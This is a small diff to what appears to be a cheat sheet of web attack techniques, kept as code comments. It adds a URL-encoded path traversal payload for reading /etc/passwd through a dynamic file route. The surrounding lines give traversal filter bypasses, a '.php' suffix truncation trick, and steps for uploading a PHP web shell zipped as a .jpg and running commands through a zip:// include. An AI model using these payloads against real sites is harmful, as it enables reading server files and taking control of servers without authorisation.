@@ -4,6 +4,8 @@
 // ....// => ../
 //* Url encoding
 // ../ => %2e%2e%2f
+// maybe there is a dynamic route
+// /get_file/<file_name> =>  /get_file/..%2f..%2f..%2fetc%2fpasswd
 //* Added .php in the path
 // whatever you enter you get /etc/passwd.php
 // since the max length in php strings is 4096
@@ -50,3 +52,4 @@
 // create a zip  of shell.php with : zip shell.jpg shell.php
 // upload it
 // then access it via : zip://path/to/shell.jpg#shell.php&cmd=cmd
+
